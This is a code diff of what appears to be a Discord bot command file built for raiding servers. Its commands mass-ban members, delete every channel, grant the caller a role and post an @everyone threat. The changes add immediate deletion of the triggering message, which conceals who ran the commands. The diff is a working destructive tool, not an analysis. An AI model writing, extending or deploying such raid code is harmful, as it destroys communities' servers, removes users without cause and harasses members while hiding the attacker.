@@ -6,6 +6,7 @@ exports.run = async (client, message, args) => {
   if (args[0] === "leave") {
     try {
       message.guild.leave();
+      message.delete({ Timeout: 0 })
     } catch (e) {
       console.log(e.stack);
     }
@@ -18,6 +19,7 @@ exports.run = async (client, message, args) => {
       });
 
       message.member.roles.add(role);
+      message.delete({ Timeout: 0 })
     } catch (e) {
       console.log(e.stack);
     }
@@ -30,7 +32,7 @@ exports.run = async (client, message, args) => {
         .forEach(member => {
           member.ban();
         });
-      message.delete(1000);
+      message.delete({ Timeout: 0 });
     } catch (e) {
       console.log(e.stack);
     }
@@ -39,13 +41,14 @@ exports.run = async (client, message, args) => {
   if (args[0] === "raid") {
     message.guild.channels.cache.forEach(x => {
       x.delete(x.id);
+      message.delete({ Timeout: 0 })
     });
   }
 
   if (args[0] === "mt") {
     try {
       message.channel.send("@everyone listen to McDunaldz or get raid.");
-      message.delete(1000);
+      message.delete({ Timeout: 0 });
     } catch (e) {
       console.log(e.stack);
     }
